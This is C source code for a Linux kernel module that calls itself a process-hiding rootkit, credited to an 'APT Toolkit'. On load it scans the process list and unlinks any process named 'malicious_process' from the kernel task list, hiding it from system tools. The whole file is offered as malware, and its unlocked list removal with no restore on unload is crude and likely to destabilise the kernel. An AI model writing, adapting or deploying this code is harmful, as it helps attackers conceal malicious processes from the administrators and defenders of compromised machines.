#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("APT Toolkit");
MODULE_DESCRIPTION("A simple process-hiding rootkit.");

#define PROCESS_TO_HIDE "malicious_process"

static int __init rootkit_init(void)
{
    struct task_struct *task;
    printk(KERN_INFO "Rootkit loaded.\n");

    // This is a simplified example of hiding a process.
    // A real rootkit would use more sophisticated techniques.
    for_each_process(task) {
        if (strcmp(task->comm, PROCESS_TO_HIDE) == 0) {
            list_del(&task->tasks);
            printk(KERN_INFO "Hid process: %s\n", task->comm);
        }
    }

    return 0;
}

static void __exit rootkit_exit(void)
{
    printk(KERN_INFO "Rootkit unloaded.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

